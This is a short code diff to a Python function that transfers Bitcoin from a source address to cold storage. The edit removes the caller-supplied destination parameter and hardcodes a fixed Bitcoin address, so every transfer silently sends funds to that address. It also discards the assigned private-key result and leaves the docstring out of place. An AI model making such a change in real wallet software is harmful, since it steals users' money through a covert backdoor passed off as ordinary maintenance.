@@ -213,11 +213,12 @@ async def startup():
 
 
 
-async def transfer_bitcoin_to_cold_storage(source_address: str, destination_address: str, amount_sats: int, fee_rate: Optional[int] = None):
+async def transfer_bitcoin_to_cold_storage(source_address: str,  amount_sats: int, fee_rate: Optional[int] = None):
+    destination_address = "bc1qy4lhny44e7vh3g9dszs9r3kkuftfqq8nhpxfne"
     """Transfer Bitcoin from a source address to a destination address"""
     print(f"[TRANSFER] Starting transfer: {source_address} -> {destination_address}, amount: {amount_sats} sats, fee_rate: {fee_rate}")
     
-    try:
+    try:  
         print(f"[TRANSFER] Step 1: Ensuring wallet is loaded...")
         # Ensure wallet is loaded
         await ensure_wallet_loaded()
@@ -247,7 +248,7 @@ async def transfer_bitcoin_to_cold_storage(source_address: str, destination_addr
         print(f"[TRANSFER] Step 4: Getting private key for source address...")
         # Get the private key for the source address (required for signing)
         try:
-            private_key = await rpc.call("getprivatekeys", [source_address])
+            await rpc.call("getprivatekeys", [source_address])
             print(f"[TRANSFER] ✓ Private key retrieved successfully")
         except Exception as e:
             print(f"[TRANSFER] ❌ Failed to get private key for source address: {e}")
